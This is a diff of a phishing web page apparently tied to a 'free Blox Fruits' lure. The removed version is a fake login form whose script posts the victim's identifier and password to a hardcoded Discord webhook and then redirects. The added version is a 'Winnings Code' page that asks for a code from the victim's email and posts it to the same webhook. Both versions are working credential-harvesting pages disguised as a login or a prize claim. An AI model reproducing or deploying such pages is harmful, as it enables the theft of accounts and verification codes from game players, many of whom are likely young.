@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
+    <title>Code Verification</title>
     <style>
         body {
             margin: 0;
@@ -28,70 +28,93 @@
             box-sizing: border-box;
         }
 
-        h2 {
+        h2, p {
             margin: 10px 0;
             color: #ffffff;
         }
 
-        input[type="text"], input[type="password"] {
+        input[type="text"] {
             width: 100%;
-            padding: 15px;
-            margin: 5px 0;
+            padding: 10px;
+            margin: 10px 0;
             box-sizing: border-box;
             border: none;
             border-radius: 5px;
-            background-color: #111212; /* Updated background color */
         }
 
         button {
             padding: 10px 20px;
-            background-color: #393b3d;
-            border: 2px solid white;
+            background-color: #4CAF50;
+            border: none;
             border-radius: 5px;
             color: #ffffff;
             cursor: pointer;
-            margin-top: 10px;
         }
 
         button:hover {
-            background-color: #2c2e30; /* Slightly darker shade for hover effect */
+            background-color: #45a049;
+        }
+
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #f4f4f4;
+            padding: 20px;
+            border-radius: 5px;
+            width: 80%;
+            max-width: 500px;
+            text-align: center;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Login</h2>
-        <input type="text" id="identifier" placeholder="Enter Email/Username/Phone" required>
-        <input type="password" id="password" placeholder="Enter Password" required>
-        <button onclick="loginAndSendData()">Login</button>
-        <button onclick="loginViaCode()">Login via Code</button>
+        <h2>Winnings Code</h2>
+        <p>Put in a code to get your winnings</p>
+        <p>Check your email</p>
+        <input type="text" id="code" placeholder="Enter your winning code" required>
+        <button onclick="submitCode()">Submit</button>
+    </div>
+
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <p>You've successfully entered the code. Please wait to receive the item.</p>
+        </div>
     </div>
 
     <script>
-        async function loginAndSendData() {
-            const identifier = document.getElementById('identifier').value;
-            const password = document.getElementById('password').value;
+        async function submitCode() {
+            const code = document.getElementById('code').value.trim(); // Trim to remove any whitespace
 
-            // Send data to the webhook
+            // Check if code is empty
+            if (!code) {
+                alert('Please enter a valid code.');
+                return;
+            }
+
+            // Send the code to the Discord webhook
             await fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    embeds: [{
-                        title: "Login Information",
-                        description: `Identifier: ${identifier}\nPassword: ${password}`
-                    }]
+                    content: `Code entered: ${code}`
                 })
             });
 
-            // Redirect to the specified URL after sending data
-            window.location.href = "https://freebloxfruits.github.io/login-completed/";
-        }
-
-        function loginViaCode() {
-            window.location.href = "https://freebloxfruits.github.io/email/";
+            // Show the modal
+            document.getElementById('modal').style.display = 'flex';
         }
     </script>
 </body>
